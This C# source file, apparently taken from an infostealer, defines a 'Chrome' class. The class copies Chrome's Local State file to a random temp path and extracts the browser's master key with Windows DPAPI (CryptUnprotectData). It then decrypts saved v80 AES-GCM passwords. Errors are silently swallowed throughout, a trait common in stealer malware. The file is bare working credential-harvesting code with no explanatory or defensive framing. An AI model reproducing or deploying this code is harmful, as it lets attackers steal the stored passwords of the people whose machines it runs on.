using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Collections;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Web.Script.Serialization;

public class Chrome
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	protected internal struct DATA_BLOB
	{
		public int cbData;

		public IntPtr pbData;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	protected internal struct CRYPTPROTECT_PROMPTSTRUCT
	{
		public int cbSize;

		public int dwPromptFlags;

		public IntPtr hwndApp;

		public string szPrompt;
	}

	protected byte[] mkey;

	[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	protected static extern bool CryptUnprotectData(ref DATA_BLOB pCipherText, ref string pszDescription, ref DATA_BLOB pEntropy, IntPtr pReserved, ref CRYPTPROTECT_PROMPTSTRUCT pPrompt, int dwFlags, ref DATA_BLOB pPlainText);

	protected static void InitPrompt(ref CRYPTPROTECT_PROMPTSTRUCT ps)
	{
		ps.cbSize = Marshal.SizeOf(typeof(CRYPTPROTECT_PROMPTSTRUCT));
		ps.dwPromptFlags = 0;
		ps.hwndApp = (IntPtr)0;
		ps.szPrompt = null;
	}

	protected static void InitBLOB(byte[] data, ref DATA_BLOB blob)
	{
		if (data == null)
		{
			data = new byte[0];
		}
		blob.pbData = Marshal.AllocHGlobal(data.Length);
		if (!(blob.pbData == IntPtr.Zero))
		{
			blob.cbData = data.Length;
			Marshal.Copy(data, 0, blob.pbData, data.Length);
		}
	}

	protected static byte[] cipher_decrypter(byte[] cipherTextBytes)
	{
		DATA_BLOB pPlainText = default(DATA_BLOB);
		DATA_BLOB blob = default(DATA_BLOB);
		DATA_BLOB blob2 = default(DATA_BLOB);
		CRYPTPROTECT_PROMPTSTRUCT ps = default(CRYPTPROTECT_PROMPTSTRUCT);
		InitPrompt(ref ps);
		string pszDescription = string.Empty;
		try
		{
			try
			{
				InitBLOB(cipherTextBytes, ref blob);
			}
			catch
			{
			}
			try
			{
				InitBLOB(Encoding.Default.GetBytes(string.Empty), ref blob2);
			}
			catch
			{
			}
			if (CryptUnprotectData(ref blob, ref pszDescription, ref blob2, IntPtr.Zero, ref ps, 1, ref pPlainText))
			{
				byte[] array = new byte[pPlainText.cbData];
				Marshal.Copy(pPlainText.pbData, array, 0, pPlainText.cbData);
				return array;
			}
			return null;
		}
		catch
		{
			return null;
		}
		finally
		{
			if (pPlainText.pbData != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(pPlainText.pbData);
			}
			if (blob.pbData != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(blob.pbData);
			}
			if (blob2.pbData != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(blob2.pbData);
			}
		}
	}

	public void GETMasterKey(string path)
	{
		try
		{
			if (File.Exists(path))
			{
				string text = $"{Buffer.path_t}{GetRandom.String()}";
				try
				{
					if (File.Exists(text))
					{
						File.Delete(text);
					}
				}
				catch
				{
				}
				try
				{
					File.Copy(path, text, overwrite: true);
				}
				catch
				{
				}
				byte[] array = Convert.FromBase64String((string)((IDictionary)((IDictionary)new JavaScriptSerializer().DeserializeObject(File.ReadAllText(text)))["os_crypt"])["encrypted_key"]);
				byte[] array2 = new byte[array.Length - 5];
				Array.Copy(array, 5, array2, 0, array.Length - 5);
				mkey = cipher_decrypter(array2);
			}
		}
		catch
		{
		}
	}

	protected static string[] GET_IVPayLoad(string encrypted_password)
	{
		return new string[2]
		{
			encrypted_password.Substring(3, 12),
			encrypted_password.Substring(15)
		};
	}

	protected static string decrypt_data(byte[] EncryptedData, byte[] key, byte[] iv)
	{
		try
		{
			GcmBlockCipher gcmBlockCipher = new GcmBlockCipher(new AesEngine());
			gcmBlockCipher.Init(forEncryption: false, new AeadParameters(new KeyParameter(key), 128, iv, null));
			byte[] array = new byte[gcmBlockCipher.GetOutputSize(EncryptedData.Length)];
			gcmBlockCipher.DoFinal(array, gcmBlockCipher.ProcessBytes(EncryptedData, 0, EncryptedData.Length, array, 0));
			return Encoding.Default.GetString(array);
		}
		catch
		{
			return null;
		}
	}

	public string Decrypt(string encrypted_password, bool v80 = true)
	{
		try
		{
			if (v80)
			{
				byte[] array = null;
				string[] array2 = null;
				array2 = GET_IVPayLoad(encrypted_password);
				array = Encoding.Default.GetBytes(array2[0]);
				string text = decrypt_data(Encoding.Default.GetBytes(array2[1]), mkey, array);
				return (text.Length > 0) ? text : null;
			}
			return Encoding.Default.GetString(cipher_decrypter(Encoding.Default.GetBytes(encrypted_password)));
		}
		catch
		{
		}
		return null;
	}
}
